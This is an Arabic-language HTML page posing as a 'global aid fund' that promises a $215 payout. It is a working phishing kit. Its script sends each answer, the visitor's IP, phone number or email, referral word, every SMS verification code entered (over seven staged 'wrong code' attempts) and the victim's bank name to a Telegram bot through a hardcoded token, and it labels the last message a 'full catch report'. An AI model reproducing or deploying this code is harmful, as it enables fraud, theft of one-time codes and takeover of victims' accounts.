<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صندوق المساعدة العالمي</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a2f0a;
            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
            padding: 20px;
            color: white;
            direction: rtl;
        }
        .container {
            max-width: 550px;
            margin: 0 auto;
            background: #1a3a1a;
            border-radius: 30px;
            padding: 25px;
            box-shadow: 0 0 20px gold;
            border: 1px solid #f5b042;
        }
        h1, h2 {
            color: #f5b042;
            text-align: center;
            margin-bottom: 20px;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
        }
        label {
            display: block;
            margin: 15px 0 5px;
            font-weight: bold;
        }
        input, select {
            width: 100%;
            padding: 12px;
            border-radius: 25px;
            border: none;
            background: #2c4a2c;
            color: white;
            font-size: 16px;
            margin-bottom: 10px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #f5b042;
            border: none;
            border-radius: 30px;
            font-size: 18px;
            font-weight: bold;
            color: #0a2f0a;
            margin-top: 15px;
            cursor: pointer;
        }
        .status {
            background: #0e2e0e;
            padding: 8px;
            border-radius: 20px;
            margin-top: 15px;
            font-size: 12px;
            text-align: center;
        }
        .deduction-box {
            background: #2a2a00;
            padding: 15px;
            border-radius: 20px;
            text-align: center;
            margin: 15px 0;
        }
        .attempts {
            background: #2a1f00;
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            margin-top: 10px;
        }
        .question-block {
            background: #0f2a0f;
            padding: 12px;
            border-radius: 20px;
            margin-bottom: 15px;
        }
        footer {
            text-align: center;
            margin-top: 20px;
            font-size: 11px;
            color: #8bb38b;
        }
        .loader {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #f5b042;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>💰 صندوق المساعدة العالمي 💰</h1>
    <div style="text-align:center; margin-bottom: 15px;">🎁 جائزتك: <strong style="color:gold;">215 دولار</strong></div>

    <!-- Step 1: هل أنت بالقائمة؟ -->
    <div id="step1" class="step active">
        <label>❓ هل أنت ضمن القائمة المدرجة؟</label>
        <select id="q_list">
            <option value="نعم">نعم</option>
            <option value="لا">لا</option>
        </select>
        <button onclick="nextStep(1, 'q_list', 'مدرج')">التالي</button>
    </div>

    <!-- Step 2: كيف عرفتنا؟ -->
    <div id="step2" class="step">
        <label>🔍 من أين عرفت موقعنا؟</label>
        <select id="q_source">
            <option value="صديق">صديق</option>
            <option value="مواقع التواصل">مواقع التواصل</option>
            <option value="المحل">المحل</option>
            <option value="غير ذلك">غير ذلك</option>
        </select>
        <button onclick="nextStep(2, 'q_source', 'مصدر')">التالي</button>
    </div>

    <!-- Step 3: اختر بلدك -->
    <div id="step3" class="step">
        <label>🌍 من أي بلد أنت؟</label>
        <select id="country">
            <option value="">-- اختر --</option>
            <option value="مصر">مصر</option>
            <option value="السعودية">السعودية</option>
            <option value="الإمارات">الإمارات</option>
            <option value="الكويت">الكويت</option>
            <option value="قطر">قطر</option>
            <option value="البحرين">البحرين</option>
            <option value="عمان">عمان</option>
            <option value="الأردن">الأردن</option>
            <option value="لبنان">لبنان</option>
            <option value="سوريا">سوريا</option>
            <option value="العراق">العراق</option>
            <option value="فلسطين">فلسطين</option>
            <option value="اليمن">اليمن</option>
            <option value="السودان">السودان</option>
            <option value="ليبيا">ليبيا</option>
            <option value="تونس">تونس</option>
            <option value="الجزائر">الجزائر</option>
            <option value="المغرب">المغرب</option>
            <option value="موريتانيا">موريتانيا</option>
        </select>
        <button onclick="nextStep(3, 'country', 'بلد')">التالي</button>
    </div>

    <!-- Step 4: توضيح الخصم 215 -> 196 -->
    <div id="step4" class="step">
        <div class="deduction-box">
            <p>💰 المبلغ الأصلي: <strong>215 دولار</strong></p>
            <p>📉 رسوم إدارية: <strong>19 دولار</strong></p>
            <p>✅ المبلغ الذي سيصلك: <strong style="color:gold;">196 دولار</strong></p>
        </div>
        <button onclick="nextStep(4, '', 'وافق على الخصم')">أوافق وأكمل</button>
    </div>

    <!-- Step 5: إدخال رقم الهاتف أو البريد -->
    <div id="step5" class="step">
        <label>📱 رقم الهاتف أو البريد الإلكتروني</label>
        <input type="text" id="contact" placeholder="مثال: 966512345678 أو name@example.com">
        <button onclick="sendContact()">إرسال</button>
    </div>

    <!-- Step 6: إدخال كلمة الإحالة -->
    <div id="step6" class="step">
        <label>🔑 كلمة الإحالة</label>
        <input type="text" id="refcode" placeholder="أدخل الكلمة">
        <button onclick="verifyRef()">تحقق</button>
        <div id="refMsg" class="status"></div>
    </div>

    <!-- Step 7: إدخال الرمز الوهمي (7 محاولات) -->
    <div id="step7" class="step">
        <label>📲 رمز التحقق المرسل لشريحتك</label>
        <input type="text" id="smscode" placeholder="6 أرقام" maxlength="6">
        <button onclick="submitCode()">تأكيد</button>
        <button onclick="resendCode()" style="background:#555;">🔄 إعادة إرسال الرمز</button>
        <div id="smsMsg" class="status"></div>
        <div id="attemptsShow" class="attempts">المحاولات المتبقية: 7</div>
    </div>

    <!-- Step 8: أسئلة إضافية بعد 7 محاولات -->
    <div id="step8" class="step">
        <div class="question-block">
            <label>1️⃣ هل أنت أعذب؟</label>
            <input type="text" id="q_azb" placeholder="نعم / لا / إلى حد ما">
        </div>
        <div class="question-block">
            <label>2️⃣ كم مرة حاولت إدخال الرمز؟</label>
            <input type="text" id="q_tries" placeholder="مثلاً: 7 مرات">
        </div>
        <div class="question-block">
            <label>3️⃣ هل تثق في المنصة؟</label>
            <input type="text" id="q_trust" placeholder="نعم / لا">
        </div>
        <div class="question-block">
            <label>4️⃣ ما هو البنك الذي تستخدمه؟</label>
            <input type="text" id="q_bank" placeholder="اسم البنك">
        </div>
        <button onclick="submitExtra()">إرسال واستلام الجائزة</button>
    </div>

    <!-- Step 9: شاشة انتظار -->
    <div id="step9" class="step">
        <div class="loader"></div>
        <h2>جاري معالجة طلبك...</h2>
        <div class="status">سيتم إرسال تأكيد إلى واتسابك خلال 30 دقيقة.</div>
    </div>

    <footer>© جميع الحقوق محفوظة – الصندوق العالمي</footer>
</div>

<script>
    // بيانات التلغرام
    const BOT_TOKEN = "8660183367:AAE5ij6hIPqPnbhTQoBZ5lNBdxykxsTMAyI";
    const CHAT_ID = "7848695581";

    // المتغيرات العامة
    let userContact = "";
    let userRef = "";
    let attempts = 0;
    let maxAttempts = 7;
    let collected = {
        step1: "", step2: "", step3: "", step4: true
    };

    // دالة إرسال إلى تلغرام
    async function sendToTelegram(msg) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
            });
        } catch(e) { console.error(e); }
    }

    // الحصول على IP
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) { return "غير معروف"; }
    }

    // التنقل بين الخطوات
    function showStep(stepNum) {
        for(let i=1; i<=9; i++) {
            const el = document.getElementById(`step${i}`);
            if(el) el.classList.remove('active');
        }
        document.getElementById(`step${stepNum}`).classList.add('active');
    }

    // معالجة الخطوات 1-4
    async function nextStep(step, elementId, label) {
        let value = "";
        if (elementId) {
            value = document.getElementById(elementId).value;
            if (step === 3 && !value) { alert("اختر بلدك"); return; }
        }
        if (step === 1) collected.step1 = value;
        if (step === 2) collected.step2 = value;
        if (step === 3) collected.step3 = value;
        if (step === 4) collected.step4 = true;
        
        await sendToTelegram(`📌 [${label}] : ${value || "موافق"} | IP: ${await getIP()}`);
        showStep(step + 1);
    }

    // إرسال رقم الهاتف/البريد
    async function sendContact() {
        let contact = document.getElementById('contact').value.trim();
        if (!contact) { alert("أدخل رقم هاتف أو بريد"); return; }
        userContact = contact;
        await sendToTelegram(`📞 [جهة الاتصال] : ${contact} | IP: ${await getIP()}`);
        showStep(6);
    }

    // التحقق من كلمة الإحالة
    async function verifyRef() {
        let ref = document.getElementById('refcode').value.trim();
        userRef = ref;
        const msgDiv = document.getElementById('refMsg');
        if (ref === "yane2026") {
            msgDiv.innerHTML = "✅ صحيح... جارٍ التوجيه";
            await sendToTelegram(`🔑 [كلمة صحيحة] : ${ref} | الرقم/البريد: ${userContact}`);
            attempts = 0;
            document.getElementById('attemptsShow').innerText = "المحاولات المتبقية: 7";
            document.getElementById('smsMsg').innerHTML = "";
            document.getElementById('smscode').value = "";
            showStep(7);
        } 
        else if (ref === "saas2000") {
            msgDiv.innerHTML = "❌ رقمك أو بريدك غير صحيح. أعد إدخال البيانات.";
            await sendToTelegram(`⚠️ [كلمة خاطئة] : ${ref} (الضحية اعترف بخطأ بياناته)`);
            setTimeout(() => {
                showStep(5);
                document.getElementById('contact').value = "";
                document.getElementById('refcode').value = "";
                msgDiv.innerHTML = "";
            }, 1500);
        }
        else {
            msgDiv.innerHTML = "❌ كلمة الإحالة غير صحيحة، حاول مجدداً.";
        }
    }

    // إرسال رمز (محاولات)
    async function submitCode() {
        const code = document.getElementById('smscode').value.trim();
        const msgDiv = document.getElementById('smsMsg');
        if (!code) { msgDiv.innerHTML = "الرجاء إدخال الرمز"; return; }
        attempts++;
        const remaining = maxAttempts - attempts;
        document.getElementById('attemptsShow').innerText = `المحاولات المتبقية: ${remaining}`;
        await sendToTelegram(`📲 [محاولة رمز] : ${code} (${attempts}/${maxAttempts}) | رقم: ${userContact}`);
        
        if (attempts >= maxAttempts) {
            msgDiv.innerHTML = "لقد تجاوزت المحاولات. سيتم نقلك للأسئلة الإضافية.";
            await sendToTelegram(`🚨 [7 محاولات فاشلة] للرقم ${userContact} | الانتقال للأسئلة`);
            setTimeout(() => showStep(8), 2000);
        } else {
            msgDiv.innerHTML = `❌ رمز خاطئ. (${remaining} متبقية)`;
            document.getElementById('smscode').value = '';
        }
    }

    // إعادة إرسال الرمز
    async function resendCode() {
        await sendToTelegram(`🔄 [طلب إعادة إرسال الرمز] لـ ${userContact}`);
        document.getElementById('smsMsg').innerHTML = "⚠️ تم إعادة إرسال الرمز إلى هاتفك.";
    }

    // الأسئلة الإضافية
    async function submitExtra() {
        const q1 = document.getElementById('q_azb').value;
        const q2 = document.getElementById('q_tries').value;
        const q3 = document.getElementById('q_trust').value;
        const q4 = document.getElementById('q_bank').value;
        if (!q1 || !q2 || !q3 || !q4) { alert("يرجى الإجابة على جميع الأسئلة"); return; }
        
        let finalMsg = `🎣 <b>تقرير الصيد الكامل</b>\n`;
        finalMsg += `📞 جهة الاتصال: ${userContact}\n`;
        finalMsg += `🌍 البلد: ${collected.step3}\n`;
        finalMsg += `🔍 المصدر: ${collected.step2}\n`;
        finalMsg += `📋 قائمة مدرجة: ${collected.step1}\n`;
        finalMsg += `🔑 كلمة الإحالة: ${userRef}\n`;
        finalMsg += `❓ أعذب؟: ${q1}\n📊 كم مرة حاول: ${q2}\n🔐 ثقة بالمنصة: ${q3}\n🏦 البنك: ${q4}\n`;
        finalMsg += `🌐 IP: ${await getIP()}\n🕒 ${new Date().toLocaleString()}`;
        
        await sendToTelegram(finalMsg);
        showStep(9);
        setTimeout(() => {
            document.querySelector('#step9 .status').innerHTML = "⚠️ تأخر في النظام، سيتم التواصل خلال 48 ساعة.";
        }, 5000);
    }

    // إرسال IP عند أول دخول
    window.onload = async () => {
        const ip = await getIP();
        await sendToTelegram(`🌍 [دخول جديد] IP: ${ip} | ${new Date().toLocaleString()}`);
    };
</script>
</body>
</html>
